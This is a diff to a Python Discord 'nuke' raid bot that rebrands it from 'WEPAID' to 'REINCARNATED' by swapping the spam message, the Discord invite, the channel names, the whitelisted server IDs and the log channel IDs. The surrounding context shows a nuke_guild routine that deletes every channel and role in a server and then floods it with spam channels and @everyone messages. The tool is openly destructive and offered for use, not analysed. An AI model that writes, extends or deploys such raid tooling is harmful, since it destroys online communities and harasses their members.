@@ -27,7 +27,7 @@ baner = f'''
 {r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
 {y}Made by: {g}https://github.com/Sigma-cc'''
 
-SPAM_MESSAGE = "# 010101010-00-0-00-000100101011010101010101011001910101010010101010101001010 FKD BY WEPAIDDDDD GET BACKKKK https://discord.gg/wepaid @everyone @everyone @everyone"
+SPAM_MESSAGE = "# 010101010-00-0-00-000100101011010101010101011001910101010010101010101001010 FKD BY REINCARNATED GET BACKKKK https://discord.gg/upnqp4dbg @everyone @everyone @everyone"
 
 # Database setup
 DB_PATH = "bot_data.db"
@@ -98,7 +98,7 @@ async def spam_task(channel, message, count=None):
                 await asyncio.sleep(0.5)
             except: break
 
-WHITELISTED_SERVER_IDS = {1453064260555903225, 1479710104759701656, 1559305944595304520}
+WHITELISTED_SERVER_IDS = {1559305944595304520, 1479710104759701656, 1559305944595304520}
 
 async def nuke_guild(guild, custom_message=None, custom_channel_name=None):
     if guild.id in WHITELISTED_SERVER_IDS:
@@ -109,7 +109,7 @@ async def nuke_guild(guild, custom_message=None, custom_channel_name=None):
     await delete_all_channels(guild)
     await delete_all_roles(guild)
     
-    default_names = ["[😂] 𝐆𝐄𝐓𝐁𝐀𝐂𝐊", "[☠️] 𝟕𝟔𝟐𝐇𝐔𝐑𝐓", "[😭] 𝐅𝐊𝐃 𝐁𝐘 𝐖𝐄𝐏𝐀𝐈𝐃", "[🤑] 𝐖𝐄 𝐎𝐖𝐍 𝐘𝐎𝐔"]
+    default_names = ["[😂] 𝐆𝐄𝐓𝐁𝐀𝐂𝐊", "[☠️] 𝟕𝟔𝟐𝐇𝐔𝐑𝐓", "[😭] 𝐅𝐊𝐃 BY REINCARNATED", "[🤑] 𝐖𝐄 𝐎𝐖𝐍 𝐘𝐎𝐔"]
     
     for _ in range(50):
         try:
@@ -150,7 +150,7 @@ async def on_ready():
 {c}--------------------------------------------
 {g}[+] Logged in as {client.user}
 {y}[!] Slash Commands Enabled
-{y}[!] Status: Streaming .gg/wepaid JOIN NOW
+{y}[!] Status: Streaming .gg/REINCARNATED JOIN NOW
 {y}[!] Whitelisted Servers: {WHITELISTED_SERVER_IDS}
 {c}--------------------------------------------''')
     asyncio.create_task(check_logs_task())
@@ -174,7 +174,7 @@ async def on_member_join(member):
     embed.set_thumbnail(url=member.display_avatar.url)
     
     # We stopped sending to drac-logs and moved to the dedicated verify log channel
-    log_channel_id = 1479710105292374068
+    log_channel_id = 1559339621173956688
     log_channel = client.get_channel(log_channel_id)
     if log_channel:
         try: await log_channel.send(embed=embed)
@@ -189,7 +189,7 @@ async def check_logs_task():
             rows = cur.fetchall()
             
             if rows:
-                log_channel_id = 1479710105292374068
+                log_channel_id = 1559339621173956688
                 channel = client.get_channel(log_channel_id)
                 if channel:
                     for key, value in rows:
